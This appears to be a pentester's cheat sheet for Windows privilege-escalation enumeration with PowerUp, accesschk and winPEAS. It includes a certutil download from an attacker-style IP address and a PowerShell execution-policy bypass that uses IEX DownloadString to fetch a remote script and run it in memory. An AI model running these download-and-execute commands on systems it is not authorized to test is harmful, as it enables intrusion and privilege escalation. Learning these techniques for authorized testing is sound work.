

# PowerUp

```bash
# Remote
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1

# local
certutil -urlcache -split -f "http://10.17.68.184:8000/PowerUp.ps1" PowerUp.ps1
```

To run PowerUp, start a PowerShell session and **use dot sourcing to load the script:**

```
CMD> powershell -exec bypass

PS> . .\PowerUp.ps1

PS> Invoke-AllChecks

# Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
```

**OR**

```
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```

# accesschk.exe

AccessChk is an old but still trustworthy tool **for checking user access control rights.**

You can use it to check whether a user or group has access to files, directories, services, and registry keys.

The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an **/accepteula** command line option.

```
https://xor.cat/assets/other/Accesschk.zip
```

**Always do this first**

```
accesschk.exe /accepteula (always do this first!!!!!)
```

**Find all weak file permission per drive.**

```
accesschk.exe -uwqs Users c:\*.*

accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

**Find all weak folder permission per drive**

```
accesschk.exe -uwdqs Users c:\

accesschk.exe -uwdqs "Authenticated Users" c:\
```

# winPEAS

winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.

```
# Code: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
```

Before running, we need to add a registry key and then reopen the command prompt:

```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Run all checks while avoiding time-consuming searches:

```
.\winPEASany.exe quiet cmd fast
```

Run specific check categories:

```
.\winPEASany.exe quiet cmd systeminfo
```